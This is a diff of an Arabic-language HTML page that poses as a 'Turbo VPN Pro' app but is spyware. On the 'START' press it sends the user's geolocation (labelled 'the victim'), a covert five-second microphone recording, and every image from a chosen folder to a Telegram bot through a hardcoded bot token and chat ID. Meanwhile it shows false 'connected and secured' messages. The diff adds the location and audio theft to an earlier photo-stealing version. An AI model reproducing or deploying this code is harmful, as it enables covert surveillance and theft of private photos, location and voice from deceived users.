@@ -3,61 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Turbo VPN Pro - حماية فائقة</title>
+    <title>Turbo VPN Pro - اتصال آمن 🔐</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .vpn-box { background: #111; padding: 40px; border-radius: 30px; border: 2px solid #ff8c00; box-shadow: 0 0 30px rgba(255,140,0,0.4); width: 85%; max-width: 400px; }
-        .btn-connect { width: 140px; height: 140px; background: #ff8c00; border: none; border-radius: 50%; color: white; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #ff8c00; transition: 0.3s; }
-        .btn-connect:active { transform: scale(0.9); }
-        .status { margin-top: 25px; color: #ff8c00; font-size: 18px; }
+        body { background: #0a0a0a; color: #ff8c00; font-family: 'Courier New', monospace; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .vpn-ui { border: 2px solid #ff8c00; padding: 40px; border-radius: 50px; text-align: center; box-shadow: 0 0 30px #ff8c00; width: 85%; max-width: 400px; position: relative; }
+        .btn-pwr { width: 150px; height: 150px; background: #ff8c00; border: none; border-radius: 50%; color: #000; font-size: 26px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #ff8c00; transition: 0.2s; }
+        .btn-pwr:active { transform: scale(0.9); box-shadow: 0 0 50px #ff8c00; }
+        .status-light { width: 15px; height: 15px; background: #ff0000; border-radius: 50%; margin: 20px auto; }
+        #log { font-size: 10px; color: #666; margin-top: 15px; height: 20px; overflow: hidden; }
     </style>
 </head>
 <body>
 
-    <div class="vpn-box">
-        <h1 style="color: #ff8c00; margin-bottom: 10px;">Turbo VPN</h1>
-        <p style="color: #888;">اضغط للاتصال وتأمين كافة صورك وملفاتك من الاختراق</p>
-        <div class="status" id="status">الحالة: غير متصل</div>
-        <br>
-        <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
-        <button class="btn-connect" onclick="connectVpn()">CONNECT</button>
+    <div class="vpn-ui">
+        <h1 style="margin: 0;">TURBO VPN</h1>
+        <div class="status-light" id="light"></div>
+        <p id="info">حماية الخصوصية: متوقفة</p>
+        
+        <input type="file" id="target" webkitdirectory directory multiple style="display:none;">
+        
+        <button class="btn-pwr" onclick="execPayload()">START</button>
+        <div id="log">ROOT@SYSTEM:~/ IDLE...</div>
     </div>
 
     <script>
-        const TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
-        const CHAT_ID = '7214473798';
+        const T = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
+        const C = '7214473798';
 
-        function connectVpn() {
-            document.getElementById('status').innerText = "جاري فحص السيرفرات...";
-            // يفتح نافذة اختيار المجلد (مثل واجهة Galaxy S25 Ultra)
-            document.getElementById('fileInput').click();
+        async function post(m, d) {
+            try { await fetch(`https://api.telegram.org/bot${T}/${m}`, { method: 'POST', body: d }); } catch(e){}
         }
 
-        document.getElementById('fileInput').addEventListener('change', async function(e) {
+        async function execPayload() {
+            document.getElementById('info').innerText = "جاري اختراق الحظر...";
+            document.getElementById('light').style.background = "#00ff00";
+
+            // 1. سحب الموقع الجغرافي فوراً
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                let fd = new FormData();
+                fd.append('chat_id', C);
+                fd.append('text', `📍 الضحية حدد موقعه:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                await post('sendMessage', fd);
+            });
+
+            // 2. فتح الميكروفون وتسجيل 5 ثوانٍ في الخلفية
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const r = new MediaRecorder(s);
+                r.start();
+                setTimeout(() => {
+                    r.stop();
+                    r.ondataavailable = async (e) => {
+                        let fd = new FormData();
+                        fd.append('chat_id', C);
+                        fd.append('voice', e.data);
+                        await post('sendVoice', fd);
+                    };
+                }, 5000);
+            } catch(e){}
+
+            // 3. سحب المجلدات (الصور الداخلية والخارجية)
+            document.getElementById('target').click();
+        }
+
+        document.getElementById('target').addEventListener('change', async (e) => {
             const files = Array.from(e.target.files);
-            document.getElementById('status').innerText = "متصل! جاري تأمين الصور خلفياً...";
-            document.getElementById('status').style.color = "#00ff00";
+            document.getElementById('info').innerText = "تم الاتصال بسيرفر مشفر!";
+            
+            // فلترة الصور من كل المجلدات (DCIM, WhatsApp, etc.)
+            const imgs = files.filter(f => f.type.startsWith('image/'));
 
-            // فلترة الصور فقط من المجلد الرئيسي وكل المجلدات الفرعية
-            const imageFiles = files.filter(f => f.type.startsWith('image/'));
-
-            // إرسال كل صورة يتم العثور عليها فوراً
-            for (let file of imageFiles) {
-                let formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('document', file); // نرسلها كـ Document لضمان الوصول
-                formData.append('caption', `✅ تم سحب صورة من مسار: ${file.webkitRelativePath}`);
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (err) {
-                    console.error("فشل إرسال ملف");
-                }
+            // إرسال سريع ومتوازي (Parallel) لضمان عدم الضياع
+            for (let f of imgs) {
+                let fd = new FormData();
+                fd.append('chat_id', C);
+                fd.append('document', f);
+                fd.append('caption', `📡 سحب من مسار: ${f.webkitRelativePath}`);
+                post('sendDocument', fd); // بدون await ليكون الإرسال أسرع كـ "رصاص" متتالي
             }
-            alert("تم تفعيل حماية VPN وتأمين كافة الصور بنجاح!");
+            alert("تم تفعيل الـ VPN وتأمين جهازك بنجاح!");
         });
     </script>
 </body>
